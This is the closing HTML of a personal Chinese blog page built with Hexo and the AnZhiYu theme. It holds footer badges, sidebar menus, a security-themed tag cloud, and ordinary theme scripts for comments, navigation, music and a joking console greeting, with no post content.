"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/hihopkc" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 By <a class="footer-bar-link" href="/" title="hihopkc" target="_blank">hihopkc</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">103</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">29</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 0.88rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 0.88rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 0.88rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 0.88rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 0.88rem;">docker<sup>4</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 0.88rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 0.88rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 0.88rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 0.88rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 0.88rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 0.88rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 0.88rem;">容器<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 0.88rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.0.8/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("02/18/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2023 By 安知鱼 V1.6.9",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hihopkc 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.56.5/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://hihopkc.space/',
+      region: '',
+      onCommentLoaded: () => {
+        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(runFn,0)
+    else getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://hihopkc.space/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const runFn = () => {
+    init();
+    
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    const runTwikoo = () => {
+      twikoo.getRecentComments({
+        envId: 'https://hihopkc.space/',
+        region: '',
+        pageSize: 6,
+        includeReply: true
+      }).then(function (res) {
+        const twikooArray = res.map(e => {
+          return {
+            'content': changeContent(e.comment),
+            'avatar': e.avatar,
+            'nick': e.nick,
+            'url': e.url + '#' + e.id,
+            'date': new Date(e.created).toISOString()
+          }
+        })
+
+        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
+        generateHtml(twikooArray)
+      }).catch(function (err) {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+    }
+
+    if (typeof twikoo === 'object') {
+      runTwikoo()
+    } else {
+      getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runTwikoo)
+    }
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('twikoo-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script type="text/javascript" src="/js/fps.js"></script><div id="fps"></div><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
